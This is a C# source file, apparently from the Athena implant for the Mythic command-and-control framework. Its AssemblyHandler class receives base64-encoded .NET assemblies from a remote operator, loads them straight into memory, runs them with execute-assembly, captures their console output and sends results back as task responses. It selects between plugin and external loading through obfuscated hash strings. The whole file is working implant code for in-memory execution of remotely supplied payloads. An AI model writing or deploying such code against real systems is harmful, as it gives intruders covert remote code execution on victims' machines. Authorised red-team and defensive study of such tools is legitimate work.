using Athena.Commands.Model;
using Athena.Models.Athena.Commands;
using Athena.Models.Athena.Assembly;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;
using System.Threading.Tasks;
using Athena.Plugins;
using Athena.Models;
using System.Linq;
using System.Data;
using System.Windows.Input;
using System.Text.Json;

namespace Athena.Commands
{
    public class AssemblyHandler
    {
        private AssemblyLoadContext commandContext { get; set; }
        private ExecuteAssemblyContext executeAssemblyContext { get; set; }
        private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
        public bool assemblyIsRunning { get; set; }
        public string assemblyTaskId { get; set; }
        private StringWriter executeAssemblyWriter { get; set; }
        public AssemblyHandler()
        {
            this.commandContext = new AssemblyLoadContext("athcmd");
            this.executeAssemblyContext = new ExecuteAssemblyContext();
            this.loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
        }
        /// <summary>
        /// See if a requested plugin already exists, and can be loaded internally
        /// </summary>
        /// <param name="name">The name of the plugin to load</param>
        private async Task<bool> TryLoadAssembly(string name)
        {
            try
            {
                Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                if (_tasksAsm != null)
                {
                    foreach (Type t in _tasksAsm.GetTypes())
                    {
                        if (typeof(IPlugin).IsAssignableFrom(t))
                        {
                            IPlugin plug = (IPlugin)Activator.CreateInstance(t);
                            loadedPlugins.GetOrAdd(name, plug);
                            return true;
                        }
                    }
                }
            }
            catch
            {
                return false;
            }
            return false;
        }
        /// <summary>
        /// Load an assembly into our execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> LoadAssemblyAsync(MythicJob job)
        {
            //This will load an assembly into our Assembly Load Context for usage with.
            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
            LoadAssembly la = JsonSerializer.Deserialize(job.task.parameters, LoadAssemblyJsonContext.Default.LoadAssembly);


            try
            {

                if (la.target.IsEqualTo("A24BCF2198B1B13AD985304483F7F324")) //plugin
                {
                    this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                }
                else if (la.target.IsEqualTo("6A21B6995A068148BBB65C8F949B3FB2")) //external
                {
                    this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                }
                else
                {
                    return new ResponseResult
                    {
                        task_id = job.task.id,
                        user_output = "Invalid target specified",
                        completed = "true",
                        status = "error"
                    }.ToJson();
                }
                //Return true if success
                return new ResponseResult
                {
                    task_id = job.task.id,
                    user_output = "Successfully loaded assembly",
                    completed = "true"
                }.ToJson();

            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    task_id = job.task.id,
                    user_output = e.Message,
                    completed = "true",
                    status = "error"
                }.ToJson();
            }
        }
        /// <summary>
        /// Execute an operator provided assembly with arguments
        /// </summary>
        /// <param name="job">MythicJob containing the assembly with arguments</param>
        public async Task<string> ExecuteAssembly(MythicJob job) //How do I deal with this now?
        {
            //Backup the original StdOut
            var origStdOut = Console.Out;
            if (assemblyIsRunning)
            {
                return new ResponseResult()
                {
                    completed = "true",
                    user_output = "An assembly is already executing.!",
                    task_id = job.task.id,
                }.ToJson();
            }

            ExecuteAssemblyTask ea = JsonSerializer.Deserialize(job.task.parameters, ExecuteAssemblyTaskJsonContext.Default.ExecuteAssemblyTask);

            //Indicating an execute-assembly task is running.
            this.assemblyIsRunning = true;
            this.assemblyTaskId = job.task.id;

            //Add an alert for when the assembly is finished executing
            try
            {
                using (this.executeAssemblyWriter = new StringWriter())
                {
                    //Capture StdOut
                    Console.SetOut(this.executeAssemblyWriter);

                    //Load the Assembly
                    var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));

                    //Invoke the Assembly
                    assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished

                    //Return StdOut back to original location
                    Console.SetOut(origStdOut);
                }

                this.assemblyIsRunning = false;

                return await this.GetAssemblyOutput();

                //Maybe set an event that the execution is finished?
            }
            catch (Exception e)
            {
                this.assemblyIsRunning = false;
                Console.SetOut(origStdOut);
                return new ResponseResult
                {
                    completed = "true",
                    user_output = this.GetAssemblyOutput() + Environment.NewLine + e + Environment.NewLine + e.ToString(),
                    task_id = job.task.id,
                    status = "error"
                }.ToJson();
            }
        }
        /// <summary>
        /// Get output from the currently running assembly
        /// </summary>
        public async Task<string> GetAssemblyOutput()
        {
            await this.executeAssemblyWriter.FlushAsync();
            string output = this.executeAssemblyWriter.GetStringBuilder().ToString();

            //Clear the writer
            this.executeAssemblyWriter.GetStringBuilder().Clear();

            return new ResponseResult
            {
                user_output = output,
                task_id = this.assemblyTaskId,
                completed = (!this.assemblyIsRunning).ToString()
            }.ToJson();
        }
        /// <summary>
        /// Clear the execution context of any loaded assemblies
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> ClearAssemblyLoadContext(MythicJob job)
        {
            //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
            //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
            try
            {
                this.executeAssemblyContext.Unload();
                this.executeAssemblyContext = new ExecuteAssemblyContext();
                return new ResponseResult
                {
                    task_id = job.task.id,
                    completed = "true",
                    user_output = "AssemblyLoadContext reset."
                }.ToJson();
            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    task_id = job.task.id,
                    completed = "true",
                    user_output = e.Message,
                    status = "error"
                }.ToJson();
            }
        }
        /// <summary>
        /// Load a command into the command execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> LoadCommandAsync(MythicJob job)
        {
            LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);

            if (this.loadedPlugins.ContainsKey(command.command))
            {
                return new LoadCommandResponseResult
                {
                    completed = "true",
                    user_output = "Command already loaded.",
                    task_id = job.task.id,
                    status = "error"
                }.ToJson();
            }

            try
            {
                var loadedAssembly = this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm)));
                foreach (Type t in loadedAssembly.GetTypes())
                {
                    if (typeof(IPlugin).IsAssignableFrom(t))
                    {
                        IPlugin plug = (IPlugin)Activator.CreateInstance(t);
                        this.loadedPlugins.GetOrAdd(command.command, plug);
                        return new LoadCommandResponseResult()
                        {
                            completed = "true",
                            user_output = "Command loaded!",
                            task_id = job.task.id,
                            commands = new List<CommandsResponse>()
                                {
                                    new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = command.command,
                                    }
                                }
                        }.ToJson();
                    }
                }

                return new LoadCommandResponseResult()
                {
                    completed = "true",
                    user_output = "Failed to load command, no assignable type." + Environment.NewLine,
                    task_id = job.task.id,
                    status = "error",
                    commands = new List<CommandsResponse>(),
                }.ToJson();
            }
            catch (Exception e)
            {
                return new LoadCommandResponseResult()
                {
                    completed = "true",
                    user_output = "Failed to load Command!" + Environment.NewLine + e.Message,
                    task_id = job.task.id,
                    status = "error",
                    commands = new List<CommandsResponse>(),
                }.ToJson();

            }
        }

        public async Task<string> UnloadCommands(MythicJob job)
        {
            //LoadCommand command = JsonSerializer.Deserialize<LoadCommand>(job.task.parameters);

            List<CommandsResponse> unloaded = new List<CommandsResponse>();

            return new LoadCommandResponseResult()
            {
                completed = "true",
                user_output = "Plugins unloaded!",
                task_id = job.task.id,
                commands = unloaded,
            }.ToJson();

        }

        /// <summary>
        /// Run a previously loaded command
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<ResponseResult> RunLoadedCommand(MythicJob job)
        {
            try
            {
                Dictionary<string, string> parameters = new Dictionary<string, string>();
                if (!String.IsNullOrEmpty(job.task.parameters))
                {
                    parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
                }
                parameters.Add("task-id", job.task.id);
                this.loadedPlugins[job.task.command].Execute(parameters);
                return null;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = e.ToString() + Environment.NewLine + e.InnerException + Environment.NewLine + e.StackTrace,
                    completed = "true",
                    status = "error",
                    task_id = job.task.id,
                };
            }
        }
        /// <summary>
        /// Check to see if a command is already loaded
        /// </summary>
        /// <param name="command">Event Sender</param>
        public async Task<bool> IsCommandLoaded(string command)
        {
            if (this.loadedPlugins.ContainsKey(command))
            {
                return true;
            }
            else
            {
                return await this.TryLoadAssembly(command);
            }
        }
    }
}
